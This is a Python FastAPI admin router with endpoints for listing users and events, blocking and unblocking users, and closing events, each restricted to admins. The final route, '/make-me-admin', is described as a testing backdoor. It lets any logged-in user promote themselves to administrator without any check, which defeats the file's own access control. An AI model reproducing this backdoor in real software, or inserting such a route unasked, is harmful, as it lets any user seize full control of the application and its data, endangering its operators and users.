from fastapi import APIRouter, Depends, HTTPException, status
from typing import List
from models import User, Event
from auth import get_current_user

router = APIRouter()

def require_admin(current_user: User = Depends(get_current_user)):
    if current_user.role != "admin":
        raise HTTPException(status_code=403, detail="Admin access required")
    return current_user

@router.get("/users", response_model=List[User])
async def list_users(admin: User = Depends(require_admin)):
    return await User.find_all().to_list()

@router.get("/events", response_model=List[Event])
async def list_events(admin: User = Depends(require_admin)):
    return await Event.find_all().to_list()

@router.put("/users/{user_id}/block")
async def block_user(user_id: str, admin: User = Depends(require_admin)):
    user = await User.get(user_id)
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    user.is_blocked = True
    await user.save()
    return {"message": f"User {user.username} blocked successfully"}

@router.put("/users/{user_id}/unblock")
async def unblock_user(user_id: str, admin: User = Depends(require_admin)):
    user = await User.get(user_id)
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    user.is_blocked = False
    await user.save()
    return {"message": f"User {user.username} unblocked successfully"}

@router.put("/events/{event_id}/close")
async def force_close_event(event_id: str, admin: User = Depends(require_admin)):
    event = await Event.get(event_id)
    if not event:
        raise HTTPException(status_code=404, detail="Event not found")
    event.is_closed = True
    await event.save()
    return {"message": f"Event {event.title} closed successfully"}

@router.post("/make-me-admin")
async def make_me_admin(current_user: User = Depends(get_current_user)):
    """Backdoor route for testing to immediately elevate privilege."""
    current_user.role = "admin"
    await current_user.save()
    return {"message": "You are now an admin!"}
